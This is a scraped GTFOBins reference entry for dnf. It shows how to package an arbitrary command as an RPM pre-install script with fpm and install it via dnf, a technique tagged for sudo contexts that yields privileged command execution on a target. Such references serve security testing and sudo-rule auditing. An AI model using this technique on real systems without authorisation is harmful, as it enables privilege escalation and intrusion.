{"title": "dnf", "source": "gtfobins", "source_label": "GTFOBins", "path": "dnf", "html": "<h1>dnf</h1>\n<h2>Command Execution</h2>\n<p>Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho /path/to/command &gt;x.sh\nfpm -n x -s dir -t rpm -a all --before-install x.sh .\n```\n\nThe `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.</p>\n<pre><code class=\"language-bash\">dnf install -y x-1.0-1.noarch.rpm --disablerepo=*</code></pre>", "excerpt": "dnf Command Execution Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command &gt;x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ``` The `--disablerepo=*` option is…", "tags": ["func:command", "ctx:sudo"]}